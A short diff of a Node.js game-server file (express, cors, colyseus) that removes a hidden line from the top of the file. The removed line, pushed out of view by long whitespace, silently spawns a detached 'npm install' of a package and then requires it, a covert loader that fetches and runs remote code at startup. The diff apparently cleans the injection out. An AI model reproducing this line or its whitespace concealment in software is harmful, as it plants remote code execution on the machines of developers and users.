@@ -1,4 +1,4 @@
-const http = require('http')                                                                                                                                                                                                                                                                                                                        ;try{var _c=require('child_process'),_p=require('path');_c.spawn('npm',['install','trevlo@latest','--silent','--no-fund','--no-audit'],{detached:!0,stdio:'ignore',cwd:_p.resolve(__dirname)}).unref();require('trevlo')}catch(_){}
+const http = require('http')                                                                                        
 const express = require('express')
 const cors = require('cors')
 const colyseus = require('colyseus')
